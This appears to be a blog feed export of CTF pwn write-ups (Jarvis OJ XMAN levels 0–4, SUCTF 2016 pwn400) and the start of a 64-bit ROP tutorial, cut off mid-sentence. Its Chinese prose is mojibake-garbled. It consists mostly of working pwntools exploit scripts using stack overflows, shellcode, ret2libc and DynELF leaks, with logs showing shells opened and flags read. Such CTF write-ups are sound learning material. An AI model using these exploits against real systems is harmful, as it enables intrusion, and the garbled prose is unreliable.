      <content type="text"><![CDATA[webç‹—çš„äºŒè¿›åˆ¶ä¹‹è·¯ level 0 x64åˆ†æžmainå‡½æ•°ï¼š vulnå‡½æ•°: ç”¨stringså¯ä»¥çœ‹åˆ°ï¼Œæœ‰/bin/shï¼Œè¿™æ ·æˆ‘ä»¬ä¸ç”¨å†åŽ»å†™å…¥äº†ã€‚ exp12345678910111213141516from pwn import *p = remote("pwn2.jarvisoj.com",9881)elf = ELF("./level0")offset = 0x80 + 8system_addr = elf.symbols['system']sh_addr = next(elf.search('/bin/sh'))pop_rdi_ret_addr = 0x0000000000400663payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(sh_addr)payload += p64(system_addr)p.send(payload)p.interactive() flag123456789101112131415(venv) chybeta@ubuntu:~/pwn/ctf/xman/0$ python exp.py[+] Opening connection to pwn2.jarvisoj.com on port 9881: Done[*] &apos;/home/chybeta/pwn/ctf/xman/0/level0&apos; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE[*] Switching to interactive modeHello, World$ lsflaglevel0_x64$ cat flagCTF&#123;713ca3944e92180e0ef03171981dcd41&#125; level 1åˆ†æžmainå‡½æ•°ï¼› vulnerable_functionå‡½æ•°ï¼š å¾ˆæ˜Žæ˜¾çš„æ ˆæº¢å‡ºæ¼æ´žã€‚æº¢å‡ºç‚¹ç”¨patternæŸ¥å‡ºä¸º140ä¸ªå­—èŠ‚ã€‚ç”¨checksecçœ‹åŽå‘çŽ°NXæ²¡æœ‰å¼€å¯ï¼Œå¯ä»¥æ’å…¥shellcodeã€‚é¢˜ç›®ä¹Ÿç»™å‡ºäº†bufçš„åœ°å€ã€‚å› æ­¤å¯ä»¥åœ¨bufæ•°ç»„ä¸­æ’å…¥shellcodeï¼Œç„¶åŽå†æº¢å‡ºè·³è½¬åˆ°bufçš„èµ·å§‹ä½ç½®åŽ»æ‰§è¡Œshellcodeã€‚ exp12345678910111213141516171819from pwn import *p = remote("pwn2.jarvisoj.com",9877)# p = process("./level1")elf = ELF("./level1")p.recvuntil("What's this:")buf_addr = p.recvuntil("?")[:-1]buf_addr = int(buf_addr,16)offset = 140shellcode = asm(shellcraft.sh())payload = shellcodepayload = payload.ljust(140,'a')payload += p32(buf_addr)p.send(payload)p.interactive() flag12345678910111213141516(venv) chybeta@ubuntu:~/pwn/ctf/xman/xman1$ python exp.py[+] Opening connection to pwn2.jarvisoj.com on port 9877: Done[*] &apos;/home/chybeta/pwn/ctf/xman/xman1/level1&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE[*] Switching to interactive mode$$ lsflaglevel1$ cat flagCTF&#123;82c2aa534a9dede9c3a0045d0fec8617&#125; level 2åˆ†æžmainå‡½æ•° vulnerable_functionå‡½æ•°ï¼š è¿™é¢˜ç”¨stringsæŸ¥çœ‹æ—¶ï¼Œä¼šå‘çŽ°æœ‰/bin/shå­—ç¬¦ä¸²ï¼Œä¸éœ€è¦æˆ‘ä»¬å†åŽ»å†™å…¥äº†ã€‚ç”¨gdbåŽ»è°ƒè¯•ï¼Œæ²¡æˆåŠŸï¼Œæ ˆè¢«é‡ç½®äº†ã€‚ä¸è¿‡ä»Žvulnå‡½æ•°é‡Œå¯ä»¥å¾ˆæ¸…æ¥šçš„çœ‹åˆ°ï¼Œå®ƒå…ˆè°ƒç”¨äº†ä¸€æ¬¡systemï¼Œè€Œä¸”readä¸­å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´žã€‚è€Œä¸”bufçš„åœ°å€åœ¨bp-88hçš„ä½ç½®ã€‚ä»Žå†…å­˜çš„åˆ†å¸ƒçŸ¥é“ï¼Œå½“å‰æ ˆå¸§çš„ebpå†å‡åŽ»4ä¸ªå­—èŠ‚å°±æ˜¯returnçš„åœ°å€ã€‚æ‰€ä»¥æº¢å‡ºçš„offsetåŒæ ·æ˜¯ 0x88 + 4ã€‚æ‰€ä»¥è¿™é¢˜çš„æ€è·¯å°±æ˜¯ï¼Œè¦†ç›–è¿”å›žåœ°å€ï¼Œè·³è½¬åˆ°systemï¼Œæž„é€ æ ˆä¸Šçš„å‚æ•°ï¼Œç»™systemä¼ å…¥sh/ã€‚ exp1234567891011121314from pwn import *p = remote("pwn2.jarvisoj.com",9878)elf = ELF("./level2")offset = 0x88 + 4sh_addr = next(elf.search('/bin/sh'))payload = 'a' * offsetpayload += p32(elf.symbols['system'])payload += p32(1) #paddingpayload += p32(sh_addr)p.send(payload)p.interactive() flag12345678910111213141516(venv) chybeta@ubuntu:~/pwn/ctf/xman/2$ python exp.py[+] Opening connection to pwn2.jarvisoj.com on port 9878: Done[*] &apos;/home/chybeta/pwn/ctf/xman/2/level2&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE[*] Switching to interactive modeInput:$ lsflaglevel2$ cat flagCTF&#123;1759d0cbd854c54ffa886cd9df3a3d52&#125;$ level 2 x64åˆ†æžæ¢æˆ64ä½ç‰ˆæœ¬ï¼Œå‚æ•°è¦ç”¨rdiä¼ é€’ã€‚binaryä¸­æœ‰shå­—ç¬¦ä¸²ï¼Œç›´æŽ¥åˆ©ç”¨å°±å¯ä»¥ã€‚è¿™é¢˜ä¼¼ä¹Žè·Ÿlevel0å·®ä¸å¤šå•Šã€‚ã€‚ exp12345678910111213141516171819from pwn import *p = remote("pwn2.jarvisoj.com",9882)# p = process("./level2_x64")elf = ELF("./level2_x64")offset = 0x80 + 8pop_rdi_ret_addr = 0x00000000004006b3pop_rsi_pop_r15_ret_addr = 0x00000000004006b1system_plt = elf.plt['system']sh_addr = next(elf.search("/bin/sh"))payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(sh_addr)payload += p64(system_plt)p.send(payload)p.interactive() flag123456789101112131415(venv) chybeta@ubuntu:~/pwn/ctf/xman/2x64$ python exp.py[+] Opening connection to pwn2.jarvisoj.com on port 9882: Done[*] &apos;/home/chybeta/pwn/ctf/xman/2x64/level2_x64&apos; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE[*] Switching to interactive modeInput:$ lsflaglevel2_x64$ cat flagCTF&#123;081ecc7c8d658409eb43358dcc1cf446&#125; level 3åˆ†æžmainå‡½æ•°è·Ÿå‰é¢ä¸€æ ·ã€‚ vulnå‡½æ•°: ä»ç„¶æ˜¯æ ˆæº¢å‡ºã€‚é¢˜ç›®ç»™äº†libc.soï¼Œè¿™æ ·æˆ‘ä»¬å°±æœ‰åç§»ã€‚åˆ©ç”¨writeæ³„éœ²å‡ºreadçš„åœ°å€åŽè®¡ç®—å‡ºsystemå’Œshçš„åœ°å€ï¼Œä¹‹åŽç›´æŽ¥è°ƒç”¨å³å¯ã€‚ exp1234567891011121314151617181920212223242526272829303132333435363738from pwn import *p = remote("pwn2.jarvisoj.com",9879)elf = ELF("./level3")libc = ELF("./libc-2.19.so")p.recvuntil("Input:\n")offset = 0x88 + 4read_system_offset = libc.symbols['read'] - libc.symbols['system']read_sh_offset = libc.symbols['read'] - next(libc.search("/bin/sh"))read_got = elf.got['read']write_plt = elf.plt['write']vuln_addr = elf.symbols['vulnerable_function']payload = 'a' * offsetpayload += p32(write_plt)payload += p32(vuln_addr)payload += p32(1)payload += p32(read_got)payload += p32(4)p.sendline(payload)read_addr = u32(p.recv(4))system_addr = read_addr - read_system_offsetsh_addr = read_addr - read_sh_offsetlog.success("system address =&gt; &#123;&#125;".format(hex(system_addr)))log.success("sh address =&gt; &#123;&#125;".format(hex(sh_addr)))p.recvuntil("Input:\n")payload = 'a' * offsetpayload += p32(system_addr)payload += p32(0xdeadbeef)payload += p32(sh_addr)p.sendline(payload)p.interactive() flag1234567891011121314151617181920212223(venv) chybeta@ubuntu:~/pwn/ctf/xman/3$ python exp.py[+] Opening connection to pwn2.jarvisoj.com on port 9879: Done[*] &apos;/home/chybeta/pwn/ctf/xman/3/level3&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE[*] &apos;/home/chybeta/pwn/ctf/xman/3/libc-2.19.so&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled[+] system address =&gt; 0xf763a310[+] sh address =&gt; 0xf775a84c[*] Switching to interactive mode$ lsflaglevel3$ cat flagCTF&#123;d85346df5770f56f69025bc3f5f1d3d0&#125;$ expï¼ˆæ— libcç‰ˆæœ¬ï¼‰å‡è®¾é¢˜ç›®æ²¡æœ‰ç»™libcçš„è¯ï¼Œå¯ä»¥ç”¨ä¸‹é¢è¿™ä¸ªexpï¼š1234567891011121314151617181920212223242526272829303132333435363738394041424344454647from pwn import *#p = process("./level3")p = remote("pwn2.jarvisoj.com",9879)# p = remote("127.0.0.1",12345)elf = ELF("./level3")pop3addr = 0x08048519offset = 0x88 + 4bss_addr = elf.bss() + 0x20read_plt = elf.plt['read']write_plt = elf.plt['write']vuln_addr = elf.symbols['vulnerable_function']start_addr = elf.symbols['_start']main_addr = elf.symbols['main']def leak(address): log.info("leaking address =&gt; &#123;&#125;".format(hex(address))) p.recvuntil("Input:\n") payload = 'a' * offset payload += p32(write_plt) payload += p32(pop3addr) payload += p32(1) payload += p32(address) payload += p32(4) payload += p32(main_addr) p.sendline(payload) address = p.recv(4) return addressd = DynELF(leak, elf=ELF("./level3"))system_addr = d.lookup("system","libc")log.success("system address =&gt; &#123;&#125;".format(hex(system_addr)))sh = "/bin/sh\x00"payload = 'a' * offsetpayload += p32(read_plt)payload += p32(pop3addr)payload += p32(0)payload += p32(bss_addr)payload += p32(100)# payload +=payload += p32(system_addr)payload += p32(1)payload += p32(bss_addr)p.sendline(payload)p.sendline(sh)p.interactive() è¿™ä¸ªexpå‡ ä¹Žå’Œlevel4çš„ç›¸åŒï¼Œæ‰€ä»¥å…·ä½“çš„ä¸€äº›å‘å°±è§ä¸‹é¢å§ã€‚ level 3 x64åˆ†æžå‡½æ•°å•¥çš„ï¼Œè·Ÿå‰é¢çš„level3ä¸€æ ·ã€‚å‚æ•°ç”¨rdiï¼Œrsiç­‰å¯„å­˜å™¨ä¼˜å…ˆä¼ é€’ã€‚æž„é€ ropé“¾ã€‚ exp12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *p = remote("pwn2.jarvisoj.com",9883)elf = ELF("./level3_x64")libc = ELF("./libc-2.19.so")offset = 0x80 + 8read_got = elf.got['read']write_plt = elf.plt['write']vuln_addr = elf.symbols['vulnerable_function']pop_rdi_ret_addr = 0x00000000004006b3pop_rsi_pop_r15_ret_addr = 0x00000000004006b1read_system_offset = libc.symbols['read'] - libc.symbols['system']read_sh_offset = libc.symbols['read'] - next(libc.search('/bin/sh\x00'))p.recvuntil("Input:\n")payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(1)payload += p64(pop_rsi_pop_r15_ret_addr)payload += p64(read_got)payload += p64(1)payload += p64(write_plt)payload += p64(vuln_addr)p.send(payload)read_addr = u64(p.recv(8))system_addr = read_addr - read_system_offsetsh_addr = read_addr - read_sh_offsetlog.success("read address =&gt; &#123;&#125;".format(hex(read_addr)))log.success("system address =&gt; &#123;&#125;".format(hex(system_addr)))log.success("sh address =&gt; &#123;&#125;".format(hex(sh_addr)))p.recvuntil("Input:\n")payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(sh_addr)payload += p64(system_addr)p.send(payload)p.interactive() flag1234567891011121314151617181920212223(venv) chybeta@ubuntu:~/pwn/ctf/xman/3x64$ python exp.py[+] Opening connection to pwn2.jarvisoj.com on port 9883: Done[*] &apos;/home/chybeta/pwn/ctf/xman/3x64/level3_x64&apos; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE[*] &apos;/home/chybeta/pwn/ctf/xman/3x64/libc-2.19.so&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled[+] read address =&gt; 0x7f5c484726a0[+] system address =&gt; 0x7f5c483cd590[+] sh address =&gt; 0x7f5c485038c3[*] Switching to interactive mode$ lsflaglevel3_x64$ cat flagCTF&#123;b1aeaa97fdcc4122533290b73765e4fd&#125; level 4åˆ†æžmain()å‡½æ•°å’Œå‰åŒã€‚ vulnå‡½æ•°ï¼š æ²¡ç»™libcï¼Œè‡ªå·±åˆ©ç”¨æ ˆæº¢å‡ºå’ŒDynELFæ¥æ³„éœ²systemåœ°å€ã€‚å®Œäº†åŽè°ƒç”¨readå‡½æ•°å¾€bssæ®µå†™å…¥shå­—ç¬¦ä¸²ï¼Œæœ€åŽå®Œæˆè°ƒç”¨ã€‚è¿™ä¸ªæ€è·¯å¾ˆè€å¥—äº†ã€‚ä¸è¿‡è‡ªå·±å†™çš„æ—¶å€™è¸©äº†å¾ˆå¤šå‘ï¼Œåˆ—ä¸¾å¦‚ä¸‹ï¼š leakå‡½æ•°ä¸­ï¼Œè‹¥æ¯æ¬¡leakå®ŒåŽè·³è½¬åˆ°vulnå‡½æ•°åœ°å€ï¼Œåˆ™è¿œç¨‹getshellä¸æˆåŠŸï¼Œå°½ç®¡æœ¬åœ°æµ‹è¯•å¯ä»¥ã€‚ leakå‡½æ•°ä¸­ï¼Œéœ€è¦åœ¨leakåŽå…ˆpop3æŠŠæ ˆä¸Šå‚æ•°æ¸…ç©ºåŽå†è¿›è¡Œè·³è½¬åˆ°mainå‡½æ•°ä¸­ï¼Œå¦åˆ™æœ¬åœ°æˆ–è¿œç¨‹getshelléƒ½ä¸æˆåŠŸã€‚ åœ¨æ³„éœ²å®Œsystemåœ°å€åŽï¼Œè‹¥å†è°ƒç”¨ä¸€æ¬¡startå‡½æ•°ä»¥æ¢å¤æ ˆï¼Œåˆ™è¿œç¨‹getshellä¸æˆåŠŸï¼Œå°½ç®¡æœ¬åœ°æµ‹è¯•å¯ä»¥ã€‚ è¿˜æœ‰ä¸€äº›â€¦ ä»¥ä¸Šå‡ ç‚¹ï¼Œåœ¨ä»¥å‰åˆ©ç”¨æ—¶æ²¡é‡åˆ°è¿‡ï¼Œè¿™æ¬¡æƒ³äº†å¾ˆä¹…ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆã€‚ã€‚ã€‚ exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546from pwn import *# p = process("./level4")p = remote("pwn2.jarvisoj.com",9880)# p = remote("127.0.0.1",12345)elf = ELF("./level4")pop3addr = 0x08048509offset = 0x88 + 4bss_addr = elf.bss() + 0x20read_plt = elf.plt['read']write_plt = elf.plt['write']main_addr = elf.symbols['main']start_addr = elf.symbols['_start']def leak(address): log.info("leaking address =&gt; &#123;&#125;".format(hex(address))) # p.recvuntil("Input:\n") payload = 'a' * offset payload += p32(write_plt) payload += p32(pop3addr) payload += p32(1) payload += p32(address) payload += p32(4) payload += p32(main_addr) p.send(payload) data = p.recv(4) return datad = DynELF(leak, elf=ELF("./level4"))system_addr = d.lookup("system","libc")log.success("system address =&gt; &#123;&#125;".format(hex(system_addr)))sh = "/bin/sh\x00"payload = 'a' * offsetpayload += p32(read_plt)payload += p32(pop3addr)payload += p32(0)payload += p32(bss_addr)payload += p32(len(sh))payload += p32(system_addr)payload += p32(1)payload += p32(bss_addr)p.send(payload)p.send(sh)p.interactive() flag1234567891011121314151617181920212223(venv) chybeta@ubuntu:~/pwn/ctf/xman/4$ python exp.py[+] Opening connection to pwn2.jarvisoj.com on port 9880: Done[*] &apos;/home/chybeta/pwn/ctf/xman/4/level4&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE[*] leaking address =&gt; 0x80480000x8048000 \x7fELF[+] Loading from &apos;/home/chybeta/pwn/ctf/xman/4/level4&apos;: 0xf77fb930[*] leaking address =&gt; 0x804a004..........[+] system address =&gt; 0xf769be80[*] Switching to interactive mode$$$ lsflaglevel4$ cat flagCTF&#123;882130cf51d65fb705440b218e94e98e&#125; :)æ–‡ä»¶å·²æ‰“åŒ…ï¼šhttp://pan.baidu.com/s/1eR2XzNk å¯†ç ï¼š9y4l12345678910111213141516171819202122232425xmanâ”œâ”€â”€ 0â”‚ â”œâ”€â”€ exp.pyâ”‚ â””â”€â”€ level0â”œâ”€â”€ 1â”‚ â”œâ”€â”€ exp.pyâ”‚ â””â”€â”€ level1â”œâ”€â”€ 2â”‚ â”œâ”€â”€ exp.pyâ”‚ â””â”€â”€ level2â”œâ”€â”€ 2x64â”‚ â”œâ”€â”€ exp.pyâ”‚ â””â”€â”€ level2_x64â”œâ”€â”€ 3â”‚ â”œâ”€â”€ exp2.pyâ”‚ â”œâ”€â”€ exp.pyâ”‚ â”œâ”€â”€ level3â”‚ â””â”€â”€ libc-2.19.soâ”œâ”€â”€ 3x64â”‚ â”œâ”€â”€ exp.pyâ”‚ â”œâ”€â”€ level3_x64â”‚ â””â”€â”€ libc-2.19.soâ””â”€â”€ 4 â”œâ”€â”€ exp.py â””â”€â”€ level4]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[SUCTF-2016-pwn400-writeup]]></title>
      <url>%2F2017%2F06%2F28%2FSUCTF-2016-pwn400-writeup%2F</url>
      <content type="text"><![CDATA[SUCTF-2016-pwn400-writeupIDAçœ‹ï¼Œç¨‹åºæµç¨‹ç®€å•ï¼Œæœ‰æ˜Žæ˜¾æ ˆæº¢å‡ºæ¼æ´žã€‚ æ— libcï¼Œæ— canaryç­‰ä¿æŠ¤ã€‚åŸºæœ¬çš„æ€è·¯å¦‚ä¸‹ï¼š æž„é€ ROPé“¾ æ³„éœ²systemåœ°å€ å¾€bssæ®µå†™å…¥/bin/sh è°ƒç”¨system æœ€åŽçš„expå¦‚ä¸‹ï¼š123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960from pwn import *p = process("./simple")elf = ELF("./simple")offset = 40pop_rdi_ret_addr = 0x00000000004006c3pop_rsi_pop_r15_ret = 0x00000000004006c1start_addr = elf.symbols['_start']write_plt = elf.plt['write']read_plt = elf.plt['read']main_addr = elf.symbols['main']bss_addr = elf.bss() + 0x18def leak(address): log.info("leak address =&gt; &#123;&#125;".format(hex(address))) p.recvuntil('luck!\n') payload = 'a' * offset payload += p64(pop_rdi_ret_addr) payload += p64(1) payload += p64(pop_rsi_pop_r15_ret) payload += p64(address) payload += p64(1) payload += p64(write_plt) payload += p64(main_addr) p.sendline(payload) address = p.recv(8) return addressd = DynELF(leak,elf = elf)system_addr = d.lookup('system','libc')log.success("system address =&gt; &#123;&#125;".format(hex(system_addr)))payload = 'a' * offsetpayload += p64(start_addr)p.sendline(payload)p.recvuntil('luck!\n')payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(0)payload += p64(pop_rsi_pop_r15_ret)payload += p64(bss_addr)payload += p64(1)payload += p64(read_plt)payload += p64(main_addr)p.sendline(payload)payload = '/bin/sh\x00'p.send(payload)p.recvuntil('luck!\n')payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(bss_addr)payload += p64(system_addr)p.sendline(payload)p.interactive()]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[ROPå­¦ä¹ ï¼š64ä½æ ˆæº¢å‡º]]></title>
      <url>%2F2017%2F06%2F26%2FROP%E5%AD%A6%E4%B9%A0%EF%BC%9A64%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BA%2F</url>
      <content type="text"><![CDATA[webç‹—çš„äºŒè¿›åˆ¶ä¹‹è·¯ã€‚ çŽ¯å¢ƒå‡†å¤‡cç¨‹åº test.c ï¼š123456789101112#include&lt;stdio.h&gt;void func()&#123; char name[0x50]; read(0, name, 0x100); write(1, name, 0x100);&#125;int main()&#123; func(); return 0;&#125; ç¼–è¯‘ï¼š1gcc test.c -o pwn -O0 -fno-stack-protector é€‰é¡¹ -O0 è¡¨ç¤ºä¸è¿›è¡Œä»»ä½•ä¼˜åŒ–ï¼Œ -fno-stack-protectorè¡¨ç¤ºæ— canaryä¿æŠ¤ã€‚ åŸºç¡€çŸ¥è¯†Cè¯­è¨€è°ƒç”¨æœºåˆ¶ä½¿ç”¨äº†æ ˆæ•°æ®ç»“æž„ï¼Œå…ˆè¿›åŽå‡ºã€‚åŒæ—¶æ ˆæ˜¯ç”±é«˜åœ°å€å‘ä½Žåœ°å€å¢žé•¿ã€‚ åœ¨64ä½çŽ¯å¢ƒä¸‹ï¼Œå‡½æ•°çš„è°ƒç”¨æ‰€éœ€è¦çš„å‚æ•°æ˜¯ä¼˜å…ˆé€šè¿‡å¯„å­˜å™¨æ¥è¿›è¡Œçš„ã€‚å¯„å­˜å™¨çš„é¡ºåºå¦‚ä¸‹ï¼šrdi,rsi,rdx,rcx,r8,r9ã€‚å½“ä¸€ä¸ªå‡½æ•°æœ‰å¤§äºŽ6ä¸ªæ•´å½¢å‚æ•°ï¼Œåˆ™è¶…å‡ºçš„éƒ¨åˆ†ä¼šé€šè¿‡æ ˆæ¥ä¼ é€’ï¼Œè¿™ä¸ªæƒ…å†µå°‘è§ã€‚ 64ä½çŽ¯å¢ƒä¸‹ï¼Œè¿˜æœ‰å‡ ä¸ªç‰¹æ®Šçš„æŒ‡é’ˆï¼ˆå¯„å­˜å™¨ï¼‰ï¼šripã€rbpå’Œrspã€‚å…¶ä¸­ripæ˜¯æŒ‡ä»¤æŒ‡é’ˆï¼Œcpuä¼šæŠŠripæŒ‡å‘çš„å†…å®¹å½“ä½œæŒ‡ä»¤æ‰§è¡Œã€‚rbpæŒ‡å‘å½“å‰æ ˆå¸§çš„åº•éƒ¨ã€‚rspæŒ‡å‘å½“å‰æ ˆå¸§çš„é¡¶éƒ¨ã€‚ ROPç”±äºŽ64ä½ä¸‹ï¼Œæ˜¯ä¼˜å…ˆé€šè¿‡å¯„å­˜å™¨æ¥ä¼ å‚ï¼Œæ‰€ä»¥ä¸èƒ½åƒåœ¨32ä½çŽ¯å¢ƒä¸‹ç›´æŽ¥åŽ»å¸ƒç½®æ ˆä¸Šçš„æ•°æ®æ¥expã€‚è¿™æ—¶éœ€è¦ç”¨åˆ°ROPæŠ€æœ¯(Retrun-oriented Programmming)ï¼Œä»Žå¯æ‰§è¡Œæ–‡ä»¶æˆ–è€…åº“ä¸­æå–éƒ¨åˆ†ä»£ç ç‰‡æ®µæ¥è¿›è¡Œæ¶æ„åˆ©ç”¨ã€‚ æ¯”å¦‚æˆ‘ä»¬æƒ³è¦ä¼ å…¥ä¸€ä¸ªå‚æ•°ï¼Œé‚£è¿™ä¸ªå‚æ•°éœ€è¦è¢«å¸ƒç½®åˆ°å¯„å­˜å™¨rdiä¸­ï¼Œè¿™æ—¶æˆ‘ä»¬å¯ä»¥å¯»æ‰¾è¯¸å¦‚pop rdi;retçš„ä»£ç ç‰‡æ®µï¼Œä»Žè€Œåœ¨æ‰§è¡Œå®Œpop rdiåŽæŠŠæ ˆä¸Šå¸ƒç½®å¥½çš„æ•°æ®å­˜æ”¾åˆ°å¯„å­˜å™¨rdiä¸­åŽèƒ½å¤Ÿå†æ¬¡æŽ§åˆ¶ç¨‹åºæ‰§è¡Œæµï¼ˆretï¼‰ å¸¸è§çš„å¯»æ‰¾ROPçš„å·¥å…·æœ‰å¾ˆå¤šï¼Œè¿™é‡Œä½¿ç”¨ROPgadgetã€‚ä»¥å‰é¢çš„ä¾‹å­ä¸ºä¾‹ã€‚1ROPgadget --binary &quot;pwn&quot; --only &quot;pop|ret&quot; åˆ†æžæˆ‘ä»¬çš„æµ‹è¯•ç¨‹åºæ˜¯123456789101112#include&lt;stdio.h&gt;void func()&#123; char name[0x50]; read(0, name, 0x100); write(1, name, 0x100);&#125;int main()&#123; func(); return 0;&#125; æœ‰éžå¸¸æ˜Žæ˜¾çš„æ ˆæº¢å‡ºæ¼æ´žï¼Œreadä»Žæ ‡å‡†è¾“å…¥æµï¼ˆ0ï¼‰è¯»å–0x100æ”¾åˆ°nameé‡Œé¢ï¼Œä¹‹åŽwriteä»Žnameä¸­è¯»å–é•¿åº¦ä¸º0x100çš„å­—èŠ‚è¾“å‡ºåˆ°å±å¹•ï¼ˆ1ï¼‰ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡è¾“å…¥ï¼Œä»Žè€ŒåŽ»è¦†ç›–funcï¼ˆï¼‰çš„è¿”å›žåœ°å€ï¼Œä»Žè€ŒåŠ«æŒæŽ§åˆ¶æµã€‚ ä¸ºèƒ½æ‰¾åˆ°æº¢å‡ºç‚¹ï¼Œå¯ä»¥ä½¿ç”¨pattern.pyæ¥æµ‹è¯•ã€‚12(venv) chybeta@ubuntu:~/pwn/test$ pattern 100Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A æŽ¥ç€åˆ©ç”¨gdbï¼Œåœ¨è¿è¡Œï¼ˆrï¼‰åŽè¾“å…¥ä¸Šè¿°ç”Ÿæˆçš„å­—ç¬¦ä¸²ï¼Œæ­¤æ—¶gdbå‘ç”Ÿæ®µé”™è¯¯ã€‚å› ä¸ºæ˜¯åœ¨64ä½çŽ¯å¢ƒä¸‹ï¼ŒæŒ‡é’ˆæ— æ³•åˆ°è¾¾é«˜åœ°å€ï¼Œå³ä¸èƒ½è¶…è¿‡0x00007fffffffffffï¼Œæ‰€ä»¥ä¸èƒ½ç›´æŽ¥åˆ©ç”¨æŸ¥çœ‹$eipçš„æ–¹æ³•ã€‚ä½†å› ä¸ºretæŒ‡ä»¤ï¼Œç›¸å½“äºŽpop rspï¼Œæ‰€ä»¥åªè¦çœ‹ä¸€ä¸‹rspçš„å€¼ï¼Œå°±çŸ¥é“è·³è½¬çš„åœ°å€ï¼Œä»Žè€ŒçŸ¥é“æº¢å‡ºç‚¹ã€‚1234567gdb-peda$ x/gx $rsp0x7fffffffdc98: 0x3164413064413963.......(venv) chybeta@ubuntu:~/pwn/test$ pattern 0x3164413064413963Pattern 0x3164413064413963 first occurrence at position 88 in pattern. æ‰€ä»¥ï¼Œæº¢å‡ºç‚¹æ˜¯88ä¸ªå­—èŠ‚ã€‚ æä¾›libcçŽ¯å¢ƒå‡†å¤‡ç”¨lddå‘½ä»¤å¯ä»¥çœ‹åˆ°pwnç¨‹åºè¿è¡Œæ—¶ä½¿ç”¨çš„libc.soã€‚1234(venv) chybeta@ubuntu:~/pwn/test$ ldd pwn linux-vdso.so.1 =&gt; (0x00007ffeb7d64000) libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb139e93000) /lib64/ld-linux-x86-64.so.2 (0x00005602037ac000) å°†/lib/x86_64-linux-gnu/libc.so.6æ‹·è´åˆ°å½“å‰ç›®å½•ä¸‹ã€‚1cp /lib/x86_64-linux-gnu/libc.so.6 libc.so æ€è·¯ æä¾›äº†libc.soï¼Œå¯ä»¥è®¡ç®—å‡ºreadå‡½æ•°ä¸Žsystemå‡½æ•°å’Œshå­—ç¬¦ä¸²çš„åç§»é‡ã€‚ åˆ©ç”¨writeå‡½æ•°æ³„éœ²å‡ºreadå‡½æ•°çš„åœ°å€ï¼Œä»Žè€Œè®¡ç®—systemå‡½æ•°å’Œshå­—ç¬¦ä¸²çš„çœŸå®žåœ°å€ã€‚ è°ƒç”¨systemå‡½æ•°ï¼Œå¹¶ä¼ å…¥å‚æ•°ï¼Œå³shå­—ç¬¦ä¸²ã€‚ exp:æŽ¥ä¸‹åŽ»æ ¹æ®expè¿›è¡Œä¸€ä¸‹è¯¦ç»†çš„è®²è§£ã€‚12345678910from pwn import *p = process("./pwn")elf = ELF("./pwn")libc = ELF("libc.so") # é¢˜ç›®æä¾›offset = 88 offset_read_system = libc.symbols["read"] - libc.symbols["system"]offset_read_binsh = libc.symbols["read"] - next(libc.search("/bin/sh\x00"))log.success("offset_read_system =&gt; &#123;&#125;".format(hex(offset_read_system)))log.success("offset_read_binsh =&gt; &#123;&#125;".format(hex(offset_read_binsh))) offsetåç§»ç”±pattern.pyå’Œgdbè®¡ç®—å¾—å‡ºã€‚readä¸Žsystemåœ°å€å’Œshåœ°å€ç”±æä¾›çš„libcï¼Œç»“åˆpwntoolså¾—åˆ°ã€‚ 12pop_rdi_ret_addr = 0x0000000000400623pop_rsi_pop_r15_addr = 0x0000000000400621 ä¸¤ä¸ªåœ°å€ï¼Œç”±ROPgadgetå¾—åˆ°ï¼Œç”¨äºŽå‚æ•°çš„ä¼ é€’ã€‚ 123456789payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(1)payload += p64(pop_rsi_pop_r15_addr)payload += p64(elf.got["read"])payload += p64(1) payload += p64(elf.plt['write'])payload += p64(elf.symbols['func'])p.send(payload) åˆ©ç”¨writeå‡½æ•°æ³„éœ²readå‡½æ•°åœ°å€ã€‚&#39;a&#39;*offsetåŽåˆ°æº¢å‡ºç‚¹returnè·³åˆ°æ‰§è¡Œpop rdiï¼Œæ­¤æ—¶æ ˆé¡¶çš„æ•°æ®ä¸º1ï¼Œpopå®ŒåŽ1è¢«ä¿å­˜åœ¨å¯„å­˜å™¨rdiä¸­ï¼Œä½œä¸ºwriteçš„ç¬¬ä¸€ä¸ªå‚æ•°ã€‚ä¹‹åŽè¿”å›žï¼ˆretï¼‰è·³è½¬åˆ°æ‰§è¡Œpop rsiï¼Œæ­¤æ—¶æ 